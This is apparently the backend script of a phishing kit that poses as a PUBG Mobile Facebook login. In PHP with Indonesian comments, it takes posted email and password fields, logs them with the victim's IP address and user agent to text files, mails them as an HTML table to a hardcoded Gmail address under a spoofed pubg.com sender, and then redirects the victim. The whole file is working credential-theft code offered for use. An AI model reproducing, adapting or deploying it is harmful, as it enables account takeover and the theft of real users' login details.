<?php
$emailkamu = "dendisaimam5@gmail.com"; //ganti emailnya
$efb = $_POST['efb'];
$pfb = $_POST['pfb'];
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$today = date("F j, Y, g:i a");
if (!empty($_POST["efb"])){
                if (!empty($_POST["pfb"])){
                        $buka=fopen("LOG-ACCOUNT.txt","a+");
                        $tulis=fopen("RESULT.txt","w");
                        fwrite($buka,"\n\r[+] RESULT PUBG Boss !\n\r[*] Poweered By Mrcakil\n\r[+] Emailnya: ".$_POST["efb"]."\n[+] Passwordnya: ".$_POST["pfb"]."\n[+] Ip Address : $ip\n\r[+] User Agent : $user_agent");
                        fwrite($tulis,"\r[+] RESULT \n\r[=] Email: ".$_POST["efb"]."\n\r[=] Pasword: ".$_POST["pfb"]);
                        fclose($buka);
                        fclose($tulis);
$subject = "PUBG Mobile | Login Facebook | '.$efb.'";
$message = '
<center> 
<div style="padding:5px;width:294;height:40px;background: black;color: black;text-align:center;">
<img width="40" style="float:left;" src="https://lh4.googleusercontent.com/proxy/8xchLnm3oiwD_vKcGW8a75R9M7tx3yThsRE_kF2r73Q-UwdBvw0Nt3ecfq-AbJ4dZ6beHkhzVpWuWUngpAGNJp0HCRL8JBUO4DayQFkaRxT74XnEAtd6mEo5db-wK8HXdQPs_A=w384-h384-nc">
<img width="40" style="float:right;" src="http://pubgmobile.com/en-US/m/images/icon_logom.png">
</div>
<table style="border-collapse:collapse;background:#ffc" width="100%" border="1">
 <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>EMAIL/PHONE/USERNAME</th>
  <th style="width:78%;text-align: center;"><b>'.$efb.'</th> 
 </tr>
 <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>PASSWORD</th>
  <th style="width:78%;text-align: center;"><b>'.$pfb.'</th> 
 </tr>
 <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>LOGIN</th>
  <th style="width:78%;text-align:center;"><b>FACEBOOK</th> 
 </tr>
</table>
<div style="padding:5px;width:294;height:40px;background: black;color:#ffc;text-align:center;">
<font size="3"><b>https://web.facebook.com/ensikology.id</b></font>
</br>
<font size="2"><b></b></font>
</div>
</center>
';

$headersx  = 'MIME-Version: 1.0' . "\r\n";
$headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headersx .= 'PUBG on Mobile | Ensikology <result@pubg.com>' . "\r\n";
$datamail = mail($emailkamu, $subject, $message, $headersx);
}
}
?>


<html>
<head>
<meta http-equiv="REFRESH" content="0;url=collect.php">
</head>
<body>
</body>
</html>
